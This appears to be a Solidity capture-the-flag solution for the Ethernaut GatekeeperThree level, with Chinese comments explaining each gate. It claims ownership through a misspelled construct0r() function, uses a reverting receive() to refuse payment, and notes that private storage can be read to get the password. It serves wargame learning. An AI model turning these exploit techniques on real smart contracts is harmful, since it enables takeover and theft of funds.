//gateOne: 还是通过部署合约调用，绕过检查
//gateTwo：construct0r() 拼写错误导致的，合约调用construct0r() 就可成为owner
//gateThree：合约可通过设置receive 添加revert()，拒绝收款，就可以通过
//password可以通过访问私有变量就可以获取

contract solution {
    GatekeeperThree public target;
    address public owner;

    constructor(address _target) {
      target = GatekeeperThree(payable(_target));
      target.construct0r();
    }


   function solve() public returns (bool entered){
     entered = target.enter();
   }

    receive () external payable {
     revert(); 
   }
}
